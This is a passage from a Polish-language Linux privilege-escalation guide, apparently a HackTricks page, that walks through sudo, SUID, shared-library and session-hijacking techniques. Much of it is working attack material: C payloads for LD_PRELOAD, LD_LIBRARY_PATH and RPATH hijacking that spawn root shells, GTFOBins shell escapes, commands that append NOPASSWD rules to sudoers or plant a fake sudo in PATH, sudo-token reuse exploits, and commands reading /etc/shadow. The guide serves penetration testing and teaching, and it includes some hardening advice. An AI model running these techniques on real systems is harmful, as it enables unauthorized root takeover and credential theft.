{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system komunikacji międzyprocesowej (IPC), który umożliwia aplikacjom wydajną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji aplikacji.

System jest wszechstronny, wspierając podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając ulepszone UNIX domain sockets. Ponadto pomaga w rozsyłaniu zdarzeń lub sygnałów, ułatwiając integrację między komponentami systemu. Na przykład sygnał od demona Bluetooth o nadchodzącym połączeniu może spowodować przyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus wspiera system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, upraszczając procesy, które tradycyjnie były skomplikowane.

D-Bus działa w modelu **allow/deny model**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego efektu pasujących reguł polityki. Te polityki określają interakcje z busem, potencjalnie umożliwiając privilege escalation poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` został podany, opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy stosują się uniwersalnie, podczas gdy polityki kontekstu "default" dotyczą wszystkich nieobjętych innymi, bardziej specyficznymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate i exploit komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieć i ustalić pozycję maszyny.

### Ogólne enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Zawsze sprawdź usługi sieciowe działające na maszynie, z którymi nie mogłeś się wcześniej komunikować przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz przechwycić credentials.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, kim jesteś, jakie masz uprawnienia (**privileges**), jacy użytkownicy (**users**) są w systemie, którzy mogą się zalogować (**login**) i którzy mają uprawnienia root (**root privileges**):
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Niektóre wersje Linuxa były dotknięte błędem, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać ci uprawnienia root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

If you **znasz jakiekolwiek hasło** środowiska **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Writable PATH abuses

### $PATH

If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.

### SUDO and SUID

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają czytać i/lub zapisywać pliki lub nawet wykonywać polecenie.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`; uzyskanie powłoki jest teraz trywialne — wystarczy dodać klucz ssh do katalogu root lub wywołać `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało załadować dowolną bibliotekę python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowany przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie Bash przy uruchamianiu nieinteraktywnym, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: Dla nieinteraktywnych shelli Bash ocenia `$BASH_ENV` i wczytuje zawartość wskazanego pliku przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera shell. Jeśli `BASH_ENV` jest zachowane przez sudo, twój plik zostanie wczytany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny target wywołujący `/bin/bash` w trybie nieinteraktywnym, lub dowolny skrypt bash).
- `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Wzmocnienie:
- Usuń `BASH_ENV` (oraz `ENV`) z `env_keep`; zamiast tego używaj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie I/O przez sudo oraz alertowanie, gdy używane są zachowane zmienne środowiskowe.

### Sudo — ścieżki omijające wykonanie

**Jump** aby odczytać inne pliki lub użyć **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeżeli użyty jest **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez określonej ścieżki

Jeśli **sudo permission** jest przyznane dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarka **suid** **wywołuje inne polecenie bez określenia ścieżki do niego (zawsze sprawdź za pomocą** _**strings**_ **zawartość podejrzanej binarki SUID)**).

[Payload examples to execute.](payloads-to-execute.md)

### Plik SUID z określoną ścieżką polecenia

Jeśli binarka **suid** **uruchamia inne polecenie, podając ścieżkę**, to możesz spróbować **wyeksportować funkcję** nazwaną tak, jak polecenie, które plik suid wywołuje.

Na przykład, jeśli binarka suid wywołuje _**/usr/sbin/service apache2 start**_ musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz binarkę **suid**, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienne środowiskowa **LD_PRELOAD** służy do określenia jednej lub więcej bibliotek współdzielonych (.so files), które loader załaduje przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Ten proces nazywa się wstępnym ładowaniem biblioteki.

Jednak, aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla wykonywalnych plików, w których realny identyfikator użytkownika (_ruid_) nie jest zgodny z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z **suid/sgid** wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również są **suid/sgid**.

Escalacja uprawnień może wystąpić, jeśli masz możliwość wykonywania poleceń przy użyciu `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala, aby zmienna środowiskowa **LD_PRELOAD** utrzymywała się i była rozpoznawana nawet podczas uruchamiania poleceń z `sudo`, co potencjalnie może doprowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **compile it** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Plik binarny SUID – .so injection

Jeśli napotkasz plik binarny z uprawnieniami **SUID**, który wydaje się nietypowy, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjał do eksploatacji.

Aby to wykorzystać, należy utworzyć plik C, powiedzmy _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie shell z podwyższonymi uprawnieniami.

Skompiluj powyższy C file do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na koniec uruchomienie dotkniętego SUID binary powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z folderu, do którego mamy uprawnienia zapisu, utwórzmy bibliotekę w tym folderze o odpowiedniej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że wygenerowana przez Ciebie biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skompilowana lista binarek Unix, które mogą być wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) działa tak samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Unix, które mogą być nadużyte do wydostania się z ograniczonych shelli, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania bind i reverse shells oraz ułatwiania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeżeli masz dostęp do `sudo -l` możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **dostęp do sudo** ale nie znasz hasła, możesz eskalować uprawnienia poprzez **oczekiwanie na wykonanie polecenia sudo, a następnie przejęcie tokenu sesji**.

Requirements to escalate privileges:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ciągu ostatnich 15mins** (domyślnie to czas ważności tokena sudo, który pozwala nam używać `sudo` bez podawania jakiegokolwiek hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` jest 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` poleceniem `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeżeli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_ **należący do root i posiadający setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Ten **trzeci exploit** (`exploit_v3.sh`) utworzy **plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **write permissions** w folderze lub na którymkolwiek z plików utworzonych w tym folderze, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\  
Na przykład, jeśli możesz overwrite plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik o PID 1234, możesz **obtain sudo privileges** bez konieczności znajomości password, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może używać `sudo` i jak. Te pliki **domyślnie mogą być czytane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** jakikolwiek plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD; pamiętaj, aby sprawdzić konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zazwyczaj łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy sudo executable**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, został wykonany twój sudo executable.

Zwróć uwagę, że jeśli użytkownik używa innego shell (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś w stylu:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą ładowane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że będą odczytane pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie przeszukiwać katalog `/usr/local/lib` w poszukiwaniu bibliotek**.

Jeśli z jakiegoś powodu **użytkownik ma prawa zapisu** do któregokolwiek z wymienionych zasobów: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnego katalogu wskazanego w pliku konfiguracyjnym w `/etc/ld.so.conf.d/*.conf`, może on być w stanie uzyskać eskalację uprawnień.\
Zobacz **jak wykorzystać tę nieprawidłową konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, zgodnie z wartością zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień roota**. Skutecznie dzielą one uprawnienia roota na **mniejsze i wyraźnie oddzielone jednostki**. Każdej z tych jednostek można następnie przyznać procesom niezależnie. W ten sposób pełen zestaw uprawnień jest ograniczany, zmniejszając ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu **bit "execute"** oznacza, że dany użytkownik może "**cd**" do folderu.\
Bit **"read"** oznacza, że użytkownik może **wypisać** **pliki**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę dostępu do pliku lub katalogu, pozwalając na przyznawanie lub odmowę praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia precyzyjniejsze zarządzanie dostępem**. Dalsze informacje można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte sesje shell

W **starszych wersjach** możesz **hijack** sesję **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** do sesji screen tylko **swojego użytkownika**. Jednakże możesz znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wypisz sesje screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem w przypadku **starych wersji tmux**. Nie byłem w stanie przejąć sesji tmux (v2.1) utworzonej przez root jako użytkownik nieuprzywilejowany.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Podłącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box z HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, etc) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Ten błąd występuje podczas tworzenia nowego klucza ssh w tych systemach operacyjnych, ponieważ **możliwe były tylko 32,768 warianty**. Oznacza to, że wszystkie możliwości można wyliczyć i **mając publiczny klucz ssh możesz wyszukać odpowiadający mu klucz prywatny**. Możesz znaleźć obliczone warianty tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH - interesujące wartości konfiguracji

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może się logować przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może logować się używając hasła i klucza prywatnego
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: root może logować się tylko przy użyciu klucza prywatnego i jeśli określono opcję commands
- `no`: brak

### AuthorizedKeysFile

Określa pliki, które zawierają klucze publiczne używane do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazywać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się za pomocą **private** key użytkownika "**testusername**", ssh porówna public key twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding umożliwia ci **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Dzięki temu będziesz w stanie **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zwróć uwagę, że jeśli `Host` jest `*`, za każdym razem gdy użytkownik przełącza się na inną maszynę, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwalać lub odmawiać tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **zablokować** ssh-agent forwarding przy użyciu słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli znajdziesz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, gdyż **możesz to wykorzystać do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` i pliki w katalogu `/etc/profile.d/` są **skryptami, które są uruchamiane, gdy użytkownik otwiera nową powłokę**. Dlatego, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś podejrzany skrypt profilu, powinieneś sprawdzić go pod kątem **poufnych informacji**.

### Passwd/Shadow Files

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **if there are hashes** wewnątrz plików:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj password jednym z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
